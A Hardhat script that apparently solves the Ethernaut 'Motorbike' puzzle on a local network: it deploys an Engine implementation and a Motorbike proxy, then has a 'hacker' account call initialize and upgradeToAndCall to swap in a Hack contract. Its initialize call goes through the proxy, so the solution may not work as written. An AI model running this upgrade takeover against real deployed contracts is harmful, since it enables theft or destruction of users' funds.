const hre = require('hardhat')

async function niceDeploy(name, ...args) {
    const Blueprint = await hre.ethers.getContractFactory(name)
    let ctr
    if (args) {
        ctr = await Blueprint.deploy(...args)
    } else {
        ctr = await Blueprint.deploy()
    }

    await ctr.deployed()
    console.log('%s deployed to: %s', name, ctr.address)
    return [Blueprint, ctr]
}

async function getSlots(ctr, pos) {
    console.log('----------- Slot Layout ----------------')
    for (let i = 0; i < pos.length; i++) {
        console.log('\tSlot[%d] = ', i, await hre.ethers.provider.getStorageAt(ctr.address, pos[i]))
    }
    console.log('----------------End Layout-----------------------')
}
async function printStatus(proxy) {
    const accounts = await hre.ethers.getSigners()
    console.log('--------------------Status-------------------')
    const stloc = '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc'
    const implloc = await hre.ethers.provider.getStorageAt(proxy.address, stloc)
    const impaddr = implloc.replace('000000000000000000000000', '')
    console.log('Engine impl at: ', implloc)
    console.log('impl code: ', (await hre.ethers.provider.getCode(impaddr)).slice(0, 32))
    console.log('---------------------END ------------------')
}

async function main() {
    let tx
    const accounts = await hre.ethers.getSigners()

    const iface = new hre.ethers.utils.Interface(['function initialize()'])

    const [Engine, ngin] = await niceDeploy('Engine')
    const [Motorbike, bike] = await niceDeploy('Motorbike', ngin.address)
    let deco = Engine.attach(bike.address)

    console.log('Requested greeting:')
    // tx = await deco.greetMe()
    // await tx.wait()

    await printStatus(bike)

    const hacker = await deco.connect(accounts[1])

    //solution

    // try {
    //     await ngin.connect(accounts[0]).initialize()
    // } catch {}
    await deco.connect(accounts[1]).initialize()

    const [Hack, hack] = await niceDeploy('Hack')
    const init_enc = iface.encodeFunctionData('initialize', [])

    await hacker.upgradeToAndCall(hack.address, init_enc)

    await printStatus(bike)
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error)
        process.exit(1)
    })
